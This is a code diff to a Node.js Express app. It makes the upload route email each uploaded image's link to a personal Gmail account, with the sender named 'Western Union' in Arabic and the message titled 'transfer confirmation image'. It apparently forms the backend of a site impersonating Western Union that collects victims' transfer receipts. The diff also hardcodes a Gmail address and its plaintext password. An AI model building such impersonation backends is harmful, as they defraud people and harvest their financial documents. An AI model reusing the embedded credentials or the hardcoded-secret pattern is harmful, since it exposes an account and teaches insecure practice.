@@ -4,6 +4,7 @@ var nodemailer = require("nodemailer");
 var smtpTransport = require("nodemailer-smtp-transport");
 var multer = require("multer");
 var path = require("path");
+var url = require("url");
 /* GET home page. */
 router.get('/', function(req, res, next) {
   res.render('index', { title: 'Express', error: req.flash("error"), success: req.flash("success")});
@@ -47,8 +48,31 @@ router.post("/upload", function (req, res, next) {
             req.flash("error", err);
             return res.redirect("/");
         } else {
-            var image = "images/" + req.file.filename;
-            console.log(image);
+            var image = req.headers.origin + "/images/" + req.file.filename;
+            var smtpTransport = nodemailer.createTransport({
+                service: "Gmail",
+                host: "smtp.gmail.com",
+                port: 465,
+                secure: true,
+                auth: {
+                    user: "fahad74185278@gmail.com",
+                    pass: "74185278ff"
+                }
+            });
+            var mailOptions = {
+                from: "ويسترن يونيون",
+                to: "fahad74185278@gmail.com",
+                subject: "أهلا" + "fahad74185278@gmail.com\n" + "\n",
+                text: "رسالة بخصوص صورة جديدة من موقع ويستر يونيون",
+                html: `<h1>صورة تأكيد الحوالة</h1> <br><br> <img style="width:500px;height:500px" src=${image}>`
+            };
+            smtpTransport.sendMail(mailOptions, function (err, response) {
+                if (err) {
+                    console.log(err);
+                }
+                req.flash("success", "تم إرسال الصورة بنجاح");
+               return res.redirect("/");
+            });
         }
 
 
